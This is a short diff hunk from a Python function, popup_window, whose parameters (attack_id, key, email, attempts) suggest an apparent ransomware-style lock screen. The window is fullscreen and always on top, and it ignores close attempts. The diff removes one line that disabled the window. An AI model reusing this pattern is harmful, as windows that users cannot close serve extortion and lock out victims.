@@ -338,7 +338,6 @@ def popup_window(attack_id, key, email, attempts):
     root.attributes('-fullscreen', True)
     root.protocol("WM_DELETE_WINDOW", do_nothing)
     root.attributes("-topmost", True)
-    root.wm_attributes("-disabled", True)
     root.resizable(False, False)
 
     # Do stuff here
